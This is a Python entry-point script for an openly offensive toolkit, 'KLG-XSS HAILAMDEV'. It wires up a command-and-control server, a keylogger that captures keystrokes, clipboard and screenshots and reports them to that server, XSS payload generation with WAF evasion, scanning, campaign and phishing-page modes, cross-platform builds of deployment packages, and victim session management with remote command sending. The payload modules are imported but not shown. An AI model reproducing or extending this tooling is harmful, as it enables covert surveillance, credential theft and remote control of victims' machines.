#!/usr/bin/env python3
import sys
import os
import argparse
import subprocess
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

def run_c2(args):
    from server.c2_server import run_server
    run_server(args.host, args.port, args.debug)

def run_keylogger(args):
    from modules.klg_tool import start_keylogger
    class Args:
        pass
    a = Args()
    a.c2 = args.c2
    a.interval = args.interval
    a.key = args.key
    a.no_mouse = args.no_mouse
    a.no_clipboard = args.no_clipboard
    a.screenshots = args.screenshots
    a.screenshot_interval = args.screenshot_interval
    a.target_apps = args.target_apps
    a.exclude_apps = args.exclude_apps
    start_keylogger(a)

def run_xss(args):
    from modules.xss_tool import generate_payloads, scan_target, run_campaign, generate_phishing, polyglot
    import sys
    sys.argv = [sys.argv[0]] + args.xss_args
    if args.xss_command == 'generate':
        class A: pass
        a = A()
        for k, v in vars(args).items():
            if k not in ['command', 'xss_command', 'xss_args']:
                setattr(a, k, v)
        generate_payloads(a)
    elif args.xss_command == 'scan':
        class A: pass
        a = A()
        for k, v in vars(args).items():
            if k not in ['command', 'xss_command', 'xss_args']:
                setattr(a, k, v)
        scan_target(a)
    elif args.xss_command == 'campaign':
        class A: pass
        a = A()
        for k, v in vars(args).items():
            if k not in ['command', 'xss_command', 'xss_args']:
                setattr(a, k, v)
        run_campaign(a)
    elif args.xss_command == 'phishing':
        class A: pass
        a = A()
        for k, v in vars(args).items():
            if k not in ['command', 'xss_command', 'xss_args']:
                setattr(a, k, v)
        generate_phishing(a)
    elif args.xss_command == 'polyglot':
        class A: pass
        a = A()
        for k, v in vars(args).items():
            if k not in ['command', 'xss_command', 'xss_args']:
                setattr(a, k, v)
        polyglot(a)

def build_deploy(args):
    from deploy.build import package_deployment
    if args.platform == 'all':
        for p in ['windows', 'macos', 'linux']:
            package_deployment(p, args.c2, args.output)
    else:
        package_deployment(args.platform, args.c2, args.output)

def main():
    parser = argparse.ArgumentParser(description='KLG-XSS HAILAMDEV Framework')
    subparsers = parser.add_subparsers(dest='command', required=True)
    
    c2_parser = subparsers.add_parser('c2', help='Start C2 server')
    c2_parser.add_argument('--host', default='0.0.0.0')
    c2_parser.add_argument('--port', type=int, default=8080)
    c2_parser.add_argument('--debug', action='store_true')
    
    klg_parser = subparsers.add_parser('keylogger', help='Start keylogger')
    klg_parser.add_argument('--c2', default='http://localhost:8080')
    klg_parser.add_argument('--interval', type=int, default=30)
    klg_parser.add_argument('--key', help='Encryption key')
    klg_parser.add_argument('--no-mouse', action='store_true')
    klg_parser.add_argument('--no-clipboard', action='store_true')
    klg_parser.add_argument('--screenshots', action='store_true')
    klg_parser.add_argument('--screenshot-interval', type=int, default=60)
    klg_parser.add_argument('--target-apps')
    klg_parser.add_argument('--exclude-apps')
    
    xss_parser = subparsers.add_parser('xss', help='XSS operations')
    xss_parser.add_argument('xss_command', choices=['generate', 'scan', 'campaign', 'phishing', 'polyglot'])
    xss_parser.add_argument('xss_args', nargs=argparse.REMAINDER)
    xss_parser.add_argument('--context', default='HTML_BODY')
    xss_parser.add_argument('--waf', action='store_true')
    xss_parser.add_argument('--count', type=int, default=10)
    xss_parser.add_argument('--encode')
    xss_parser.add_argument('--mutate', type=int)
    xss_parser.add_argument('--url')
    xss_parser.add_argument('--param', default='q')
    xss_parser.add_argument('--method', default='GET')
    xss_parser.add_argument('--name', default='xss_campaign')
    xss_parser.add_argument('--target-file')
    xss_parser.add_argument('--c2', default='http://localhost:8080')
    xss_parser.add_argument('--output')
    xss_parser.add_argument('--format', choices=['json', 'csv'], default='json')
    xss_parser.add_argument('--target-url')
    xss_parser.add_argument('--template', choices=['login', 'generic', 'pdf'], default='login')
    xss_parser.add_argument('--contexts', default='HTML_BODY,HTML_ATTRIBUTE,JAVASCRIPT')
    
    build_parser = subparsers.add_parser('build', help='Build deployment packages')
    build_parser.add_argument('--platform', choices=['windows', 'macos', 'linux', 'all'], default='all')
    build_parser.add_argument('--c2', default='http://localhost:8080')
    build_parser.add_argument('--output', default='deploy')
    
    manage_parser = subparsers.add_parser('manage', help='Manage sessions')
    manage_parser.add_argument('manage_command', choices=['list', 'get', 'export', 'cmd'])
    manage_parser.add_argument('--c2', default='http://localhost:8080')
    manage_parser.add_argument('--session-id')
    manage_parser.add_argument('--output')
    manage_parser.add_argument('--command')
    
    args = parser.parse_args()
    
    if args.command == 'c2':
        run_c2(args)
    elif args.command == 'keylogger':
        run_keylogger(args)
    elif args.command == 'xss':
        run_xss(args)
    elif args.command == 'build':
        build_deploy(args)
    elif args.command == 'manage':
        from modules.klg_tool import list_sessions, get_session, export_session, send_command
        class A: pass
        a = A()
        a.c2 = args.c2
        a.session_id = args.session_id
        a.output = args.output
        a.command = args.command
        
        if args.manage_command == 'list':
            list_sessions(a)
        elif args.manage_command == 'get':
            get_session(a)
        elif args.manage_command == 'export':
            export_session(a)
        elif args.manage_command == 'cmd':
            send_command(a)

if __name__ == '__main__':
    main()